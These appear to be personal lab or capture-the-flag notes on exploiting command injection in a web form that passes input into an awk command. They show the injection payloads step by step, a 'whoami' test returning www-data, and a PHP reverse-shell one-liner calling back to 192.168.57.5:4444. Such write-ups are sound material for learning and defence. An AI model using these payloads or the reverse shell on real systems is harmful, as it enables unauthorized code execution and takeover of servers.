
i/p:
100
200

Executed: awk 'BEGIN {print sqrt(((100-50)^2) + ((200-50)^2))}'  
Result: 158.114

**1. AWK Operations:**   
(a) Scans a file line by line   
(b) Splits each input line into fields   
(c) Compares input line/fields to pattern   
(d) Performs action(s) on matched lines

try command injection on 2nd payload

i/p
100
50)^2))}';whoami;

o/p:
Executed: awk 'BEGIN {print sqrt(((100-100)^2) + ((200-50)^2))}';whoami;)^2))}'  
Result:

we get no result


i/p:

100
50)^2))}';whoami;#

add hash to comment out rest of command

o/p:
Executed: awk 'BEGIN {print sqrt(((100-100)^2) + ((200-50)^2))}';whoami;#)^2))}'  
Result: 150 www-data

i/p:
100
50)^2))}';php -r '$sock=fsockopen("192.168.57.5",4444);exec("/bin/sh -i <&3 >&3 2>&3");';#

 dont forget the hash to ccomment out rest of command
![[Pasted image 20230715180821.png]]

and we get a shell

